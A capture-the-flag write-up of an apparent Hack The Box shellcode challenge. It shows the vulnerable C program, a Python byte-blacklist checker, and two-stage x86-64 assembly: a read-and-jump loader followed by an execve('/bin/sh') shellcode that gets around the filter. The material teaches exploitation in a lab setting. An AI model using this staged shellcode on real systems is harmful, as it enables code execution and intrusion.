This challenge from hack the box is an easy challenge to start writing shellcode. 
It gives to you an executable and it's source code:
```C
// gcc execute.c -z execstack -o execute
#include <signal.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void setup() {
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);
	alarm(0x7f);
}
int check(char *a, char *b, int size, int op) {
	for(int i = 0; i < op; i++) {
		for(int j = 0; j < size-1; j++) {
			if(a[i] == b[j])
	return 0;
		}
	}
	return 1337;
}

  

int main(){

	char buf[62];

	char blacklist[] = "\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67";

	setup();

	puts("Hey, just because I am hungry doesn't mean I'll execute everything");

	int size = read(0, buf, 60);

	if(!check(blacklist, buf, size, strlen(blacklist))) {

		puts("Hehe, told you... won't accept everything");

	exit(1337);

	}
	( ( void (*) () ) buf) ();
}
```
 It just read in a buffer your input and then it executes your code.  The only problem is that the challenge blacklists some bytes.

to understand what i can do and what i cannot i write a python script that assemble my assembly and then check what of its part are blacklisted:

```python
asm_code="""
mov rax, 0x3b
"""
shellcode=asm(asm_code)
for i in shellcode:
	if i in b"\x3b\x54\x62\x69\x6e\x73\x68\xf6\xd2\xc0\x5f\xc9\x66\x6c\x61\x67":
	print(f"Found {hex(i)} = {i}")
```

After some tries i understood that i cannot use RAX in my instructions and that i cannot write "/bin/sh\x00" in my input. 
Since using GDB i understood that in RAX there was already the value 0x0 i decide to use the read syscall. My plan was:
- Read my second stage shellcode in memory
- Jump to it

This is the assembly for the first stage:
``` Assembly
xor rdi, rdi
mov rdx, 0x100
add rsi, 60
syscall
jmp rsi
```

For the second stage indeed i just wrote an easy shellcode that does an execve(/bin/sh\x00,0,0):
```assembly
mov rax, 0x3b
mov rdi, rsi
add rdi, 22
xor rsi, rsi
xor rdx, rdx
syscall
```